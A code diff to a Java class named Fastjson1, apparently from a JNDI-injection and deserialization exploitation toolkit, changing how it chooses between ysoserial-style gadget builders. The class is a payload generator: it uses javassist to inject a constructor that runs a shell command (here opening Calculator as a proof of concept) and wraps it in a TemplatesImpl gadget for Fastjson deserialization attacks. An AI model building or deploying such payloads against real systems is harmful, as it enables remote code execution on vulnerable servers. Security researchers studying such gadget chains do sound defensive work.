@@ -12,6 +12,7 @@ import javassist.CtConstructor;
 import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Field;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 public class Fastjson1 implements ObjectPayload<Object> {
@@ -25,7 +26,7 @@ public class Fastjson1 implements ObjectPayload<Object> {
         constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
         clazz.addConstructor(constructor);
         final Object templates;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             templates = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             templates = Gadgets.createTemplatesImpl(type, param);
